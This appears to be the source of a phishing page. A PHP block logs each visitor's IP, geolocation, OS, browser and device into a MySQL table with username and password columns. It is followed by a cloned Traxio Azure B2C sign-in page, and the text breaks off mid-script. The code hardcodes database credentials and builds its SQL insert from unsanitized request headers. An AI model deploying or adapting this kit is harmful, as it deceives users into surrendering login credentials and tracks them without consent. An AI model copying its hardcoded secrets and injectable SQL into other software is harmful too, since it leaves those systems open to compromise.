<html>
<body>
<?php
$servername = "localhost";
$username = "jens";
$password = "Admin@2020";
$dbname = "logs";

//OS Fingerprinting
class UserInfo
{
    private function get_user_agent()
    {
        return $_SERVER['HTTP_USER_AGENT'];
    }

    public static function get_ip()
    {
        $mainIp = '';
        if (getenv('HTTP_CLIENT_IP'))
            $mainIp = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $mainIp = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $mainIp = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $mainIp = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $mainIp = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $mainIp = getenv('REMOTE_ADDR');
        else
            $mainIp = 'UNKNOWN';
        return $mainIp;
    }

    public static function get_os()
    {

        $user_agent = self::get_user_agent();
        $os_platform = "Unknown OS Platform";
        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile'
        );

        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }
        }
        return $os_platform;
    }

    public static function get_browser()
    {

        $user_agent = self::get_user_agent();

        $browser = "Unknown Browser";

        $browser_array = array(
            '/msie/i' => 'Internet Explorer',
            '/Trident/i' => 'Internet Explorer',
            '/firefox/i' => 'Firefox',
            '/safari/i' => 'Safari',
            '/chrome/i' => 'Chrome',
            '/edge/i' => 'Edge',
            '/opera/i' => 'Opera',
            '/netscape/i' => 'Netscape',
            '/maxthon/i' => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/ubrowser/i' => 'UC Browser',
            '/mobile/i' => 'Handheld Browser'
        );

        foreach ($browser_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $browser = $value;
            }

        }

        return $browser;

    }

    public static function get_device()
    {

        $tablet_browser = 0;
        $mobile_browser = 0;

        if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
            $tablet_browser++;
        }

        if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
            $mobile_browser++;
        }

        if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']), 'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
            $mobile_browser++;
        }

        $mobile_ua = strtolower(substr(self::get_user_agent(), 0, 4));
        $mobile_agents = array(
            'w3c ', 'acs-', 'alav', 'alca', 'amoi', 'audi', 'avan', 'benq', 'bird', 'blac',
            'blaz', 'brew', 'cell', 'cldc', 'cmd-', 'dang', 'doco', 'eric', 'hipt', 'inno',
            'ipaq', 'java', 'jigs', 'kddi', 'keji', 'leno', 'lg-c', 'lg-d', 'lg-g', 'lge-',
            'maui', 'maxo', 'midp', 'mits', 'mmef', 'mobi', 'mot-', 'moto', 'mwbp', 'nec-',
            'newt', 'noki', 'palm', 'pana', 'pant', 'phil', 'play', 'port', 'prox',
            'qwap', 'sage', 'sams', 'sany', 'sch-', 'sec-', 'send', 'seri', 'sgh-', 'shar',
            'sie-', 'siem', 'smal', 'smar', 'sony', 'sph-', 'symb', 't-mo', 'teli', 'tim-',
            'tosh', 'tsm-', 'upg1', 'upsi', 'vk-v', 'voda', 'wap-', 'wapa', 'wapi', 'wapp',
            'wapr', 'webc', 'winw', 'winw', 'xda ', 'xda-');

        if (in_array($mobile_ua, $mobile_agents)) {
            $mobile_browser++;
        }

        if (strpos(strtolower(self::get_user_agent()), 'opera mini') > 0) {
            $mobile_browser++;
            //Check for tablets on opera mini alternative headers
            $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA']) ? $_SERVER['HTTP_X_OPERAMINI_PHONE_UA'] : (isset($_SERVER['HTTP_DEVICE_STOCK_UA']) ? $_SERVER['HTTP_DEVICE_STOCK_UA'] : ''));
            if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
                $tablet_browser++;
            }
        }

        if ($tablet_browser > 0) {
            // do something for tablet devices
            return 'Tablet';
        } else if ($mobile_browser > 0) {
            // do something for mobile devices
            return 'Mobile';
        } else {
            // do something for everything else
            return 'Computer';
        }
    }
}
$os = UserInfo::get_os();
$browser = UserInfo::get_browser();
$device = UserInfo::get_device();

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

//Get IP
$ip="";
if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
{
    $ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
{
    $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $ip=$_SERVER['REMOTE_ADDR'];
}

//Some Geolocation stuff
$var_export = (unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
$city = $var_export['geoplugin_city'];
$region = $var_export['geoplugin_region'];
$regionName = $var_export['geoplugin_regionName'];
$countryName = $var_export['geoplugin_countryName'];
$continentName = $var_export['geoplugin_continentName'];
$latitude = $var_export['geoplugin_latitude'];
$longitude = $var_export['geoplugin_longitude'];
$timezone = $var_export['geoplugin_timezone'];

//Get POST data
$username = "Logged entry";
$password = "without login";

//Insert to database
$sql = "INSERT INTO logentries (username, password, ip_address, date, os, browser, device, city, regionname, countryname, latitude, longitude)
VALUES ('$username', '$password', '$ip', now(), '$os', '$browser', '$device', '$city', '$regionName','$countryName', '$latitude', '$longitude') ";

if ($conn->query($sql) === TRUE) {
}

$conn->close();
?>

<html lang="en"><head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Traxio</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="font-awesome.css">
    <link rel="icon" href="favicon.ico" type="image/x-icon"/>

    <script data-container="true" nonce="2JHgEoqysB8q69DiPMXF6A==">
        var CP = {"list":[]};
        var SA_FIELDS = {"AttributeFields":[{"UX_INPUT_TYPE":"TextBox","USER_INPUT_TYPE":"TextBox","IS_TEXT":true,"IS_EMAIL":false,"IS_PASSWORD":false,"IS_DATE":false,"IS_RADIO":false,"IS_DROP":false,"IS_TEXT_IN_PARAGRAPH":false,"IS_CHECK_MULTI":false,"IS_LINK":false,"VERIFY":false,"DN":"Sign in name","ID":"signInName","U_HELP":"","DAY_PRE":"0","MONTH_PRE":"0","YEAR_PRE":"0","IS_REQ":true,"IS_RDO":false,"OPTIONS":[]},{"UX_INPUT_TYPE":"Password","USER_INPUT_TYPE":"Password","IS_TEXT":false,"IS_EMAIL":false,"IS_PASSWORD":true,"IS_DATE":false,"IS_RADIO":false,"IS_DROP":false,"IS_TEXT_IN_PARAGRAPH":false,"IS_CHECK_MULTI":false,"IS_LINK":false,"VERIFY":false,"DN":"Password","ID":"password","U_HELP":"Enter password","DAY_PRE":"0","MONTH_PRE":"0","YEAR_PRE":"0","IS_REQ":true,"IS_RDO":false,"OPTIONS":[]}]};


        var CONTENT = {"remember_me":"Keep me signed in","invalid_password":"The password you entered is not in the expected format.","cancel_message":"The user has forgotten their password","requiredField_email":"Vul uw e-mailadres in / Entrez votre email","logonIdentifier_username":"Username","forgotpassword_link":"Wachtwoord vergeten? / Mot de passe oubli&#233;?","local_intro_email":"Login","invalid_email":"Vul een geldig e-mailadres in / Entrez un e-mail valide","createaccount_link":"Login aanmaken / Cr&#233;er un login","unknown_error":"We are having trouble signing you in. Please try again later.","requiredField_username":"Please enter your user name","logonIdentifier_email":"E-mail","email_pattern":"^[a-zA-Z0-9.!#$%&amp;’&#39;*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\\.[a-zA-Z0-9-]+)*$","requiredField_password":"Vul uw wachtwoord in / Entrez votre mot de passe","password":"Wachtwoord / Mot de passe","divider_title":"OR","email_tooltip":"Please enter a valid email address.","createaccount_intro":"","social_intro":"Sign in with your social account","button_signin":"Aanmelden / Connectez-vous","local_intro_username":"Sign in with your user name"};

        var SETTINGS = {"remoteResource":"https://traxioprod.blob.core.windows.net/azureb2c/signin.html","retryLimit":3,"trimSpacesInPassword":true,"api":"CombinedSigninAndSignup","csrf":"OFpUVnBpNklLWVlxL2dPelhVbnhGQ3dyZTBNUG9jMFRWQ0FMRkVBbC80d2oyeUpRMGR6ZUc2bjdMam82YVJKeHVqb1d3UGhSRTVaRjNVZzZiTDlFdFE9PTsyMDIwLTExLTIyVDExOjUwOjQxLjQ4MzA0ODlaO1c2clJsNVNiRzlNL0hRbGVmNVdQa3c9PTt7Ik9yY2hlc3RyYXRpb25TdGVwIjoxfQ==","transId":"StateProperties=eyJUSUQiOiJmOWUwMjFhMS0wMjA3LTQ5MzYtODZiYi0yYmNlM2IxZmM0ODIifQ","pageViewId":"6f491440-6624-499a-93e3-a1cac0b8a377","suppressElementCss":false,"isPageViewIdSentWithHeader":false,"allowAutoFocusOnPasswordField":true,"pageMode":0,"config":{"showSignupLink":"True","operatingMode":"Email","sendHintOnSignup":"False","forgotPasswordLinkLocation":"AfterLabel","includePasswordRequirements":"true","enableRememberMe":"false","announceVerCompleteMsg":"True"},"sanitizerPolicy":{allowedTags:['h1','u','h2','h3','h4','h5','h6','blockquote','p','a','ul','ol','nl','li','b','i','strong','em','strike','code','hr','br','div','table','thead','caption','tbody','tr','th','td','pre','img','video','source','span','footer','header','nav','main','style','meta','title','link','section','input','form','button','marquee','label'],allowedAttributes:{'*':['id','class','href','name','data-*','aria-*','type','lang','src','sizes','role','placeholder','title','width','height','style'],form:['method','action','target','accept-charset','novalidate'],input:['value'],a:['target'],img:['alt'],video:['controls','preload','poster'],meta:['http-equiv','content','charset'],link:['rel']},selfClosing:['img','br','hr','area','base','basefont','input','link','meta'],allowedSchemes:['http','https','mailto'],allowProtocolRelative:true,exclusiveFilter: function (frame) {return frame.tag === 'meta' && (frame.attribs['http-equiv'] && frame.attribs['http-equiv'].toUpperCase().indexOf('REFRESH') >= 0) || (frame.attribs['content'] && /data:/gmi.test(frame.attribs['content'])) || frame.tag === 'link' && (frame.attribs['rel'] && frame.attribs['rel'].toUpperCase().indexOf('IMPORT') >= 0)}},"hosts":{"tenant":"/b809c8c9-58cc-42ce-a5e6-d916f678dea4/B2C_1A_signup_signin","policy":"B2C_1A_signup_signin","static":"https://traxiob2c.b2clogin.com/static/"},"locale":{"lang":"en"},"tenantBranding":{"Locale":"0","backgroundColor":"#0000FF"},"xhrSettings":{"retryEnabled":true,"retryMaxAttempts":3,"retryDelay":200,"retryExponent":2,"retryOn":["error","timeout"]}};


        !function(n,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.Handlebars=t():n.Handlebars=t()}(this,function(){return function(n){function t(r){if(i[r])return i[r].exports;var u=i[r]={exports:{},id:r,loaded:!1};return n[r].call(u.exports,u,u.exports,t),u.loaded=!0,u.exports}var i={};return t.m=n,t.c=i,t.p="",t(0)}([function(n,t,i){"use strict";function o(){var n=new s.HandlebarsEnvironment;return e.extend(n,s),n.SafeString=a["default"],n.Exception=y["default"],n.Utils=e,n.escapeExpression=e.escapeExpression,n.VM=h,n.template=function(t){return h.template(t,n)},n}var u=i(1)["default"],f=i(2)["default"];t.__esModule=!0;var c=i(3),s=u(c),l=i(20),a=f(l),v=i(5),y=f(v),p=i(4),e=u(p),w=i(21),h=u(w),b=i(33),k=f(b),r=o();r.create=o;k["default"](r);r["default"]=r;t["default"]=r;n.exports=t["default"]},function(n,t){"use strict";t["default"]=function(n){var t,i;if(n&&n.__esModule)return n;if(t={},null!=n)for(i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i]);return t["default"]=n,t};t.__esModule=!0},function(n,t){"use strict";t["default"]=function(n){return n&&n.__esModule?n:{"default":n}};t.__esModule=!0},function(n,t,i){"use strict";function e(n,t,i){this.helpers=n||{};this.partials=t||{};this.decorators=i||{};v.registerDefaultHelpers(this);y.registerDefaultDecorators(this)}var s=i(2)["default"],h,c,f,l;t.__esModule=!0;t.HandlebarsEnvironment=e;var r=i(4),a=i(5),o=s(a),v=i(9),y=i(17),p=i(19),u=s(p);t.VERSION="4.0.12";h=7;t.COMPILER_REVISION=h;c={1:"<= 1.0.rc.2",2:"== 1.0.0-rc.3",3:"== 1.0.0-rc.4",4:"== 1.x.x",5:"== 2.0.0-alpha.x",6:">= 2.0.0-beta.1",7:">= 4.0.0"};t.REVISION_CHANGES=c;f="[object Object]";e.prototype={constructor:e,logger:u["default"],log:u["default"].log,registerHelper:function(n,t){if(r.toString.call(n)===f){if(t)throw new o["default"]("Arg not supported with multiple helpers");r.extend(this.helpers,n)}else this.helpers[n]=t},unregisterHelper:function(n){delete this.helpers[n]},registerPartial:function(n,t){if(r.toString.call(n)===f)r.extend(this.partials,n);else{if("undefined"==typeof t)throw new o["default"]('Attempting to register a partial called "'+n+'" as undefined');this.partials[n]=t}},unregisterPartial:function(n){delete this.partials[n]},registerDecorator:function(n,t){if(r.toString.call(n)===f){if(t)throw new o["default"]("Arg not supported with multiple decorators");r.extend(this.decorators,n)}else this.decorators[n]=t},unregisterDecorator:function(n){delete this.decorators[n]}};l=u["default"].log;t.log=l;t.createFrame=r.createFrame;t.logger=u["default"]},function(n,t){"use strict";function e(n){return v[n]}function f(n){for(var i,t=1;t<arguments.length;t++)for(i in arguments[t])Object.prototype.hasOwnProperty.call(arguments[t],i)&&(n[i]=arguments[t][i]);return n}function o(n,t){for(var i=0,r=n.length;i<r;i++)if(n[i]===t)return i;return-1}function s(n){if("string"!=typeof n){if(n&&n.toHTML)return n.toHTML();if(null==n)return"";if(!n)return n+"";n=""+n}return p.test(n)?n.replace(y,e):n}function h(n){return!n&&0!==n||!(!u(n)||0!==n.length)}function c(n){var t=f({},n);return t._parent=n,t}function l(n,t){return n.path=t,n}function a(n,t){return(n?n+".":"")+t}var i,u;t.__esModule=!0;t.extend=f;t.indexOf=o;t.escapeExpression=s;t.isEmpty=h;t.createFrame=c;t.blockParams=l;t.appendContextPath=a;var v={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;","=":"&#x3D;"},y=/[&<>"'`=]/g,p=/[&<>"'`=]/,r=Object.prototype.toString;t.toString=r;i=function(n){return"function"==typeof n};i(/x/)&&(t.isFunction=i=function(n){return"function"==typeof n&&"[object Function]"===r.call(n)});t.isFunction=i;u=Array.isArray||function(n){return!(!n||"object"!=typeof n)&&"[object Array]"===r.call(n)};t.isArray=u},function(n,t,i){"use strict";function u(n,t){var e=t&&t.loc,s=void 0,o=void 0,h,i;for(e&&(s=e.start.line,o=e.start.column,n+=" - "+s+":"+o),h=Error.prototype.constructor.call(this,n),i=0;i<r.length;i++)this[r[i]]=h[r[i]];Error.captureStackTrace&&Error.captureStackTrace(this,u);try{e&&(this.lineNumber=s,f?Object.defineProperty(this,"column",{value:o,enumerable:!0}):this.column=o)}catch(c){}}var f=i(6)["default"],r;t.__esModule=!0;r=["description","fileName","lineNumber","message","name","number","stack"];u.prototype=new Error;t["default"]=u;n.exports=t["default"]},function(n,t,i){n.exports={"default":i(7),__esModule:!0}},function(n,t,i){var r=i(8);n.exports=function(n,t,i){return r.setDesc(n,t,i)}},function(n){var t=Object;n.exports={create:t.create,getProto:t.getPrototypeOf,isEnum:{}.propertyIsEnumerable,getDesc:t.getOwnPropertyDescriptor,setDesc:t.defineProperty,setDescs:t.defineProperties,getKeys:t.keys,getNames:t.getOwnPropertyNames,getSymbols:t.getOwnPropertySymbols,each:[].forEach}},function(n,t,i){"use strict";function u(n){e["default"](n);s["default"](n);c["default"](n);a["default"](n);y["default"](n);w["default"](n);k["default"](n)}var r=i(2)["default"];t.__esModule=!0;t.registerDefaultHelpers=u;var f=i(10),e=r(f),o=i(11),s=r(o),h=i(12),c=r(h),l=i(13),a=r(l),v=i(14),y=r(v),p=i(15),w=r(p),b=i(16),k=r(b)},function(n,t,i){"use strict";t.__esModule=!0;var r=i(4);t["default"]=function(n){n.registerHelper("blockHelperMissing",function(t,i){var f=i.inverse,e=i.fn,u;return t===!0?e(this):t===!1||null==t?f(this):r.isArray(t)?t.length>0?(i.ids&&(i.ids=[i.name]),n.helpers.each(t,i)):f(this):(i.data&&i.ids&&(u=r.createFrame(i.data),u.contextPath=r.appendContextPath(i.data.contextPath,i.name),i={data:u}),e(t,i))})};n.exports=t["default"]},function(n,t,i){"use strict";var u=i(2)["default"];t.__esModule=!0;var r=i(4),f=i(5),e=u(f);t["default"]=function(n){n.registerHelper("each",function(n,t){function s(t,i,f){u&&(u.key=t,u.index=i,u.first=0===i,u.last=!!f,o&&(u.contextPath=o+t));h+=a(n[t],{data:u,blockParams:r.blockParams([n[t],t],[o+t,null])})}var l,f,c;if(!t)throw new e["default"]("Must pass iterator to #each");var a=t.fn,v=t.inverse,i=0,h="",u=void 0,o=void 0;if(t.data&&t.ids&&(o=r.appendContextPath(t.data.contextPath,t.ids[0])+"."),r.isFunction(n)&&(n=n.call(this)),t.data&&(u=r.createFrame(t.data)),n&&"object"==typeof n)if(r.isArray(n))for(l=n.length;i<l;i++)i in n&&s(i,i,i===n.length-1);else{f=void 0;for(c in n)n.hasOwnProperty(c)&&(void 0!==f&&s(f,i-1),f=c,i++);void 0!==f&&s(f,i-1,!0)}return 0===i&&(h=v(this)),h})};n.exports=t["default"]},function(n,t,i){"use strict";var f=i(2)["default"],r,u;t.__esModule=!0;r=i(5);u=f(r);t["default"]=function(n){n.registerHelper("helperMissing",function(){if(1!==arguments.length)throw new u["default"]('Missing helper: "'+arguments[arguments.length-1].name+'"');})};n.exports=t["default"]},function(n,t,i){"use strict";t.__esModule=!0;var r=i(4);t["default"]=function(n){n.registerHelper("if",function(n,t){return r.isFunction(n)&&(n=n.call(this)),!t.hash.includeZero&&!n||r.isEmpty(n)?t.inverse(this):t.fn(this)});n.registerHelper("unless",function(t,i){return n.helpers["if"].call(this,t,{fn:i.inverse,inverse:i.fn,hash:i.hash})})};n.exports=t["default"]},function(n,t){"use strict";t.__esModule=!0;t["default"]=function(n){n.registerHelper("log",function(){for(var i,r=[void 0],t=arguments[arguments.length-1],u=0;u<arguments.length-1;u++)r.push(arguments[u]);i=1;null!=t.hash.level?i=t.hash.level:t.data&&null!=t.data.level&&(i=t.data.level);r[0]=i;n.log.apply(n,r)})};n.exports=t["default"]},function(n,t){"use strict";t.__esModule=!0;t["default"]=function(n){n.registerHelper("lookup",function(n,t){return n&&n[t]})};n.exports=t["default"]},function(n,t,i){"use strict";t.__esModule=!0;var r=i(4);t["default"]=function(n){n.registerHelper("with",function(n,t){var u,i;return(r.isFunction(n)&&(n=n.call(this)),u=t.fn,r.isEmpty(n))?t.inverse(this):(i=t.data,t.data&&t.ids&&(i=r.createFrame(t.data),i.contextPath=r.appendContextPath(t.data.contextPath,t.ids[0])),u(n,{data:i,blockParams:r.blockParams([n],[i&&i.contextPath])}))})};n.exports=t["default"]},function(n,t,i){"use strict";function f(n){u["default"](n)}var e=i(2)["default"],r,u;t.__esModule=!0;t.registerDefaultDecorators=f;r=i(18);u=e(r)},function(n,t,i){"use strict";t.__esModule=!0;var r=i(4);t["default"]=function(n){n.registerDecorator("inline",function(n,t,i,u){var f=n;return t.partials||(t.partials={},f=function(u,f){var e=i.partials,o;return i.partials=r.extend({},e,t.partials),o=n(u,f),i.partials=e,o}),t.partials[u.args[0]]=u.fn,f})};n.exports=t["default"]},function(n,t,i){"use strict";t.__esModule=!0;var u=i(4),r={methodMap:["debug","info","warn","error"],level:"info",lookupLevel:function(n){if("string"==typeof n){var t=u.indexOf(r.methodMap,n.toLowerCase());n=t>=0?t:parseInt(n,10)}return n},log:function(n){var t;if(n=r.lookupLevel(n),"undefined"!=typeof console&&r.lookupLevel(r.level)<=n){t=r.methodMap[n];console[t]||(t="log");for(var u=arguments.length,f=Array(u>1?u-1:0),i=1;i<u;i++)f[i-1]=arguments[i];console[t].apply(console,f)}}};t["default"]=r;n.exports=t["default"]},function(n,t){"use strict";function i(n){this.string=n}t.__esModule=!0;i.prototype.toString=i.prototype.toHTML=function(){return""+this.string};t["default"]=i;n.exports=t["default"]},function(n,t,i){"use strict";function h(n){var t=n&&n[0]||1,i=u.COMPILER_REVISION,f,e;if(t!==i){if(t<i){f=u.REVISION_CHANGES[i];e=u.REVISION_CHANGES[t];throw new r["default"]("Template was precompiled with an older version of Handlebars than the current runtime. Please update your precompiler to a newer version ("+f+") or downgrade your runtime to an older version ("+e+").");}throw new r["default"]("Template was precompiled with a newer version of Handlebars than the current runtime. Please update your runtime to a newer version ("+n[1]+").");}}function c(n,t){function o(i,u,e){var o;if(e.hash&&(u=f.extend({},u,e.hash),e.ids&&(e.ids[0]=!0)),i=t.VM.resolvePartial.call(this,i,u,e),o=t.VM.invokePartial.call(this,i,u,e),null==o&&t.compile&&(e.partials[e.name]=t.compile(i,n.compilerOptions,t),o=e.partials[e.name](u,e)),null!=o){if(e.indent){for(var h=o.split("\n"),s=0,c=h.length;s<c&&(h[s]||s+1!==c);s++)h[s]=e.indent+h[s];o=h.join("\n")}return o}throw new r["default"]("The partial "+e.name+" could not be compiled when running in runtime-only mode");}function u(t){function h(t){return""+n.main(i,t,i.helpers,i.partials,f,o,e)}var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],f=r.data,e,o;return u._setup(r),!r.partial&&n.useData&&(f=v(t,f)),e=void 0,o=n.useBlockParams?[]:void 0,n.useDepths&&(e=r.depths?t!=r.depths[0]?[t].concat(r.depths):r.depths:[t]),(h=s(n.main,h,i,r.depths||[],f,o))(t,r)}if(!t)throw new r["default"]("No environment passed to template");if(!n||!n.main)throw new r["default"]("Unknown template object: "+typeof n);n.main.decorator=n.main_d;t.VM.checkRevision(n.compiler);var i={strict:function(n,t){if(!(t in n))throw new r["default"]('"'+t+'" not defined in '+n);return n[t]},lookup:function(n,t){for(var r=n.length,i=0;i<r;i++)if(n[i]&&null!=n[i][t])return n[i][t]},lambda:function(n,t){return"function"==typeof n?n.call(t):n},escapeExpression:f.escapeExpression,invokePartial:o,fn:function(t){var i=n[t];return i.decorator=n[t+"_d"],i},programs:[],program:function(n,t,i,r,u){var f=this.programs[n],o=this.fn(n);return t||u||r||i?f=e(this,n,o,t,i,r,u):f||(f=this.programs[n]=e(this,n,o)),f},data:function(n,t){for(;n&&t--;)n=n._parent;return n},merge:function(n,t){var i=n||t;return n&&t&&n!==t&&(i=f.extend({},t,n)),i},nullContext:y({}),noop:t.VM.noop,compilerInfo:n.compiler};return u.isTop=!0,u._setup=function(r){r.partial?(i.helpers=r.helpers,i.partials=r.partials,i.decorators=r.decorators):(i.helpers=i.merge(r.helpers,t.helpers),n.usePartial&&(i.partials=i.merge(r.partials,t.partials)),(n.usePartial||n.useDecorators)&&(i.decorators=i.merge(r.decorators,t.decorators)))},u._child=function(t,u,f,o){if(n.useBlockParams&&!f)throw new r["default"]("must pass block params");if(n.useDepths&&!o)throw new r["default"]("must pass parent depths");return e(i,t,n[t],u,0,f,o)},u}function e(n,t,i,r,u,f,e){function o(t){var u=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],o=e;return!e||t==e[0]||t===n.nullContext&&null===e[0]||(o=[t].concat(e)),i(n,t,n.helpers,n.partials,u.data||r,f&&[u.blockParams].concat(f),o)}return o=s(i,o,n,e,r,f),o.program=t,o.depth=e?e.length:0,o.blockParams=u||0,o}function l(n,t,i){return n?n.call||i.name||(i.name=n,n=i.partials[n]):n="@partial-block"===i.name?i.data["partial-block"]:i.partials[i.name],n}function a(n,t,i){var s=i.data&&i.data["partial-block"],e;if(i.partial=!0,i.ids&&(i.data.contextPath=i.ids[0]||i.data.contextPath),e=void 0,i.fn&&i.fn!==o&&!function(){i.data=u.createFrame(i.data);var n=i.fn;e=i.data["partial-block"]=function(t){var i=arguments.length<=1||void 0===arguments[1]?{}:arguments[1];return i.data=u.createFrame(i.data),i.data["partial-block"]=s,n(t,i)};n.partials&&(i.partials=f.extend({},i.partials,n.partials))}(),void 0===n&&e&&(n=e),void 0===n)throw new r["default"]("The partial "+i.name+" could not be found");if(n instanceof Function)return n(t,i)}function o(){return""}function v(n,t){return t&&"root"in t||(t=t?u.createFrame(t):{},t.root=n),t}function s(n,t,i,r,u,e){if(n.decorator){var o={};t=n.decorator(t,o,i,r&&r[0],u,e,r);f.extend(t,o)}return t}var y=i(22)["default"],p=i(1)["default"],w=i(2)["default"];t.__esModule=!0;t.checkRevision=h;t.template=c;t.wrapProgram=e;t.resolvePartial=l;t.invokePartial=a;t.noop=o;var b=i(4),f=p(b),k=i(5),r=w(k),u=i(3)},function(n,t,i){n.exports={"default":i(23),__esModule:!0}},function(n,t,i){i(24);n.exports=i(29).Object.seal},function(n,t,i){var r=i(25);i(26)("seal",function(n){return function(t){return n&&r(t)?n(t):t}})},function(n){n.exports=function(n){return"object"==typeof n?null!==n:"function"==typeof n}},function(n,t,i){var r=i(27),u=i(29),f=i(32);n.exports=function(n,t){var i=(u.Object||{})[n]||Object[n],e={};e[n]=t(i);r(r.S+r.F*f(function(){i(1)}),"Object",e)}},function(n,t,i){var f=i(28),e=i(29),o=i(30),u="prototype",r=function(n,t,i){var s,l,h,p=n&r.F,a=n&r.G,w=n&r.S,y=n&r.P,b=n&r.B,k=n&r.W,v=a?e:e[t]||(e[t]={}),c=a?f:w?f[t]:(f[t]||{})[u];a&&(i=t);for(s in i)l=!p&&c&&s in c,l&&s in v||(h=l?c[s]:i[s],v[s]=a&&"function"!=typeof c[s]?i[s]:b&&l?o(h,f):k&&c[s]==h?function(n){var t=function(t){return this instanceof n?new n(t):n(t)};return t[u]=n[u],t}(h):y&&"function"==typeof h?o(Function.call,h):h,y&&((v[u]||(v[u]={}))[s]=h))};r.F=1;r.G=2;r.S=4;r.P=8;r.B=16;r.W=32;n.exports=r},function(n){var t=n.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=t)},function(n){var t=n.exports={version:"1.2.6"};"number"==typeof __e&&(__e=t)},function(n,t,i){var r=i(31);n.exports=function(n,t,i){if(r(n),void 0===t)return n;switch(i){case 1:return function(i){return n.call(t,i)};case 2:return function(i,r){return n.call(t,i,r)};case 3:return function(i,r,u){return n.call(t,i,r,u)}}return function(){return n.apply(t,arguments)}}},function(n){n.exports=function(n){if("function"!=typeof n)throw TypeError(n+" is not a function!");return n}},function(n){n.exports=function(n){try{return!!n()}catch(t){return!0}}},function(n,t){(function(i){"use strict";t.__esModule=!0;t["default"]=function(n){var t="undefined"!=typeof i?i:window,r=t.Handlebars;n.noConflict=function(){return t.Handlebars===n&&(t.Handlebars=r),n}};n.exports=t["default"]}).call(t,function(){return this}())}])});$i2e=function(n,t){return{VERSION:"2.0.0",APPLE_IDP_PATH_REGEX:new RegExp(/\?social=.*apple.*/i),redirectToServer:function(n){this.isSafari()&&this.APPLE_IDP_PATH_REGEX.test(n)||(this.redirectToServer=function(){});$diags.trace(new $trace("T002",!1));var t=this.getRedirectLink(n);$(document).ready(function(){window.diagsAlways&&(t+="&diags="+encodeURIComponent($diags.toJson()));window.location.replace(t)})},getRedirectLink:function(n){return n=n+(n.indexOf("?")===-1?"?":"&")+"csrf_token="+t.csrf+"&tx="+t.transId,window.Metrics!==undefined&&(n+="&metrics="+encodeURIComponent(window.Metrics.serialize())),t.hosts.tenant+"/api/"+t.api+"/"+n+"&p="+t.hosts.policy},sendData:function(n,i,r){r=r!==undefined?r:t;var f=r.hosts.tenant+"/"+r.api+(i!==undefined?"/"+i:"")+"?tx="+r.transId+"&p="+r.hosts.policy,u={"X-CSRF-TOKEN":t.csrf};return t.isPageViewIdSentWithHeader&&(u["x-ms-cpim-pageviewid"]=t.pageViewId),$.ajax({type:"POST",dataType:"json",headers:u,timeout:r.config.timeout||9e4,url:f,cache:!1,data:n})},sendDataWithRetry:function(n,i,r,u,f,e){var h,s,o;return 